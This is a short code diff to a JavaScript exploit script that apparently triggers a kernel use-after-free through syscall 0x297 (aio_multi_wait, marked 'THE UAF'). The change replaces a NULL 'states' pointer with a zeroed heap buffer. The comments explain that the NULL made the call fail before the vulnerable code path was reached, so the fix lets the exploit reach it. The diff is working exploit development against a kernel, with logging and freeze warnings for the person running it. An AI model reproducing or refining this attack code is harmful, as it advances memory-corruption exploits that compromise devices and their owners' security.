@@ -1545,9 +1545,14 @@
              * and 500x after the wake -- that timing discipline is the main difference
              * between our 11:21 'no observable effect' and a real measurement. */
             notify("bagagwa: ARMING aio_multi_wait num=2 -- possible freeze; wait or power cycle");
-            var wargs = [ids, 2n, 0n, 0n, 0n];              /* (ids, num=2, states=NULL, mode=0, timeout=0) */
+            /* states (arg3) is dereferenced whenever num>=1 -- the ABI map measured this
+             * (row arg1 col2: valid ids, states=NULL -> EFAULT). Passing NULL is why the
+             * 11:21 armed run never reached the linking code. */
+            var statesBuf = zeros(malloc(0x80), 0x80);
+            out("ARM-states", "states=0x" + statesBuf.toString(16) + " (non-NULL)", "dim");
+            var wargs = [ids, 2n, statesBuf, 0n, 0n];       /* (ids, num=2, states, mode=0, timeout=0) */
             var w = null, threw = null;
-            try { w = S("aio_multi_wait(ids, num=2) -- THE UAF", 0x297, wargs); }
+            try { w = S("aio_multi_wait(ids, num=2, states) -- THE UAF", 0x297, wargs); }
             catch (e) { threw = String((e && e.message) || e).slice(0, 90); }
             out("ARM-wait", "num=2 returned " + (w && w.ret !== undefined ? hex(w.ret) + (w.errName ? " (" + w.errName + ")" : "") : (threw || "threw")), w && w.ret !== undefined && B(w.ret) === 0n ? "ok" : "warn");
             settle(200);                                    /* let kernel workers run */
